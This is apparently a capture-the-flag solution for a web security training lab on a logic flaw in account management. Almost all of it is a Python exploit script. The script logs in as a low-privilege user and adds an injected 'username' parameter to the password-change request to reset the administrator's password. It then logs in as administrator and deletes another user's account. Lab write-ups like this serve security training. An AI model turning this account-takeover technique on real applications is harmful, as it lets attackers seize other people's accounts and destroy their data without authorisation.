# Weak isolation on dual-use endpoint

> This lab makes a flawed assumption about the user's privilege level based on their input. As a result, you can exploit the logic of its account management features to gain access to arbitrary users' accounts. To solve the lab, access the `administrator` account and delete the user `carlos`.
> You can log in to your own account using the following credentials: `wiener:peter`

```python
import requests
from bs4 import BeautifulSoup

# Configuration
BASE_URL = "https://0a60000e04571c4b81a6d92500c40085.web-security-academy.net/"

def exploit_dual_use_endpoint(url):
    session = requests.Session()
    
    # 1. Standard Authentication Phase
    login_endpoint = f"{url}login"
    response = session.get(login_endpoint)
    soup = BeautifulSoup(response.text, 'html.parser')
    csrf_token = soup.find("input", {"name": "csrf"})['value']
    
    login_credentials = {
        "username": "wiener",
        "password": "peter",
        "csrf": csrf_token
    }
    
    response = session.post(login_endpoint, data=login_credentials)
    
    if "Log out" in response.text:
        print("[+] LOGIN SUCCESSFUL AS WIENER")

        # 2. Exploitation Phase (Parameter Injection)
        account_endpoint = f"{url}my-account"
        response = session.get(account_endpoint)
        soup = BeautifulSoup(response.text, 'html.parser')
        change_pw_csrf = soup.find("input", {"name": "csrf"})['value']
        
        change_pw_endpoint = f"{url}my-account/change-password"
        
        # Injecting 'username' parameter triggers the admin code path
        exploit_payload = {
            "csrf": change_pw_csrf,
            "username": "administrator",
            "new-password-1": "tactical_override",
            "new-password-2": "tactical_override"
        }
        
        response = session.post(change_pw_endpoint, data=exploit_payload)
        
        if "Password changed successfully!" in response.text:
            print("[+] NEW PASSWORD SET FOR ADMINISTRATOR")
            
            # 3. Privilege Escalation Phase (Re-login as Admin)
            response = session.get(login_endpoint)
            soup = BeautifulSoup(response.text, 'html.parser')
            admin_login_csrf = soup.find("input", {"name": "csrf"})['value']
            
            admin_credentials = {
                "username": "administrator",
                "password": "tactical_override",
                "csrf": admin_login_csrf
            }
            
            response = session.post(login_endpoint, data=admin_credentials)
            
            if "Log out" in response.text:
                print("[+] LOGIN SUCCESSFUL AS ADMINISTRATOR")
                
                # 4. Execution Phase
                delete_endpoint = f"{url}admin/delete"
                target_data = {"username": "carlos"}
                
                session.get(delete_endpoint, params=target_data)
                
                # Verification
                final_response = session.get(url)
                if "Congratulations" in final_response.text:
                    print("[+] TARGET CARLOS DELETED: Lab Solved")

if __name__ == "__main__":
    exploit_dual_use_endpoint(BASE_URL)
```